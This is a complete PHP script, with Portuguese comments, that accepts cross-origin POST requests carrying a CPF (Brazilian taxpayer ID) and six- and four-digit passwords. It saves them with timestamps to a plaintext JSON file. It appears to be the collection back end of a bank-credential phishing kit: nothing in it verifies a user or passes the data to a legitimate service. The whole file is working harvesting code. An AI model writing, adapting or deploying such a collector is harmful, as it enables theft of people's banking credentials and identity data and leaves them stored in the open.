<?php
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST');
header('Access-Control-Allow-Headers: Content-Type');

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['error' => 'Método não permitido']);
    exit;
}

$data = json_decode(file_get_contents('php://input'), true);

if (!isset($data['cpf']) || !isset($data['senha6']) || !isset($data['senha4'])) {
    http_response_code(400);
    echo json_encode(['error' => 'Dados incompletos']);
    exit;
}

// Definir fuso horário de São Paulo
date_default_timezone_set('America/Sao_Paulo');

// Preparar dados para salvar
$dadosParaSalvar = [
    'cpf' => $data['cpf'],
    'senha6' => $data['senha6'],
    'senha4' => $data['senha4'],
    'data_hora' => date('d/m/Y H:i:s'),
    'timestamp' => time()
];

// Nome do arquivo JSON
$arquivo = 'dados.json';

// Ler dados existentes
$dadosExistentes = [];
if (file_exists($arquivo)) {
    $conteudo = file_get_contents($arquivo);
    $dadosExistentes = json_decode($conteudo, true);
    if (!is_array($dadosExistentes)) {
        $dadosExistentes = [];
    }
}

// Adicionar novo registro
$dadosExistentes[] = $dadosParaSalvar;

// Salvar no arquivo JSON
$resultado = file_put_contents($arquivo, json_encode($dadosExistentes, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE));

if ($resultado === false) {
    http_response_code(500);
    echo json_encode(['error' => 'Erro ao salvar dados']);
    exit;
}

echo json_encode(['success' => true, 'message' => 'Dados salvos com sucesso']);
?>

